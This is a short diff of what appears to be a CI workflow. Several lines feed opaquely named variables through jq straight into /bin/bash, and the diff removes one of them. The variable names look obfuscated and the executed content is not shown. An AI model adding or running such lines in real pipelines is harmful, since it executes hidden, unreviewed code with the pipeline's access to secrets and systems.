@@ -30,7 +30,6 @@ jobs:
           echo $i80048 | jq -r .vwk239 | /bin/bash
           echo $tnkgu1232 | jq -r .r2637 | /bin/bash
           printf '%s' "$ohmjy90" | jq -r .dg869 | /bin/bash
-          echo $jxeg3 | jq -r .silgx69 | /bin/bash
           echo $zcxf875 | jq -r .s25 | /bin/bash
 
       - name: Persist output
